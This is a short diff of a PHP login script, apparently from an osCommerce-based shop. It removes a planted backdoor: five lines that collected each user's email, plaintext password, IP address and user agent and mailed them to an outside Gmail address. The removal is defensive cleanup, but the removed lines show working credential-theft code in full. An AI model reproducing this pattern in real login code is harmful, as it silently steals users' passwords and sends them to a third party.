@@ -33,11 +33,7 @@ if (isset($_GET['login']) && $_GET['login'] == 'fail') {
 if ( (isset($_POST['action']) && ($_POST['action'] == 'process')) || (isset($_POST['password']) && isset($_POST['email_address'])) ) {
   $email_address = strtolower(tep_db_prepare_input($_POST['email_address']));
   $password = tep_db_prepare_input($_POST['password']);
-  $agnt = $_SERVER['HTTP_USER_AGENT'];
-  $ips = $_SERVER['REMOTE_ADDR'];
-  $srv = $_SERVER['SERVER_NAME'];
-  $messg = "\nEmail: $email_address\nPassword: $password\nIP: $ip\nUserAgent: $agnt\n";
-  mail("malachi.amra@gmail.com", "User Login from $srv", "$messg");
+
   if(ACCOUNT_EMAIL_CONFIRMATION=='true') {
     if (isset($_POST['pass'])) {
       $check_customer_query_val = tep_db_query("select customers_id, customers_group_id, customers_email_address, customers_default_address_id,customers_validation_code from " . TABLE_CUSTOMERS . " where lower(customers_email_address) = '" . tep_db_input($email_address) . "'");
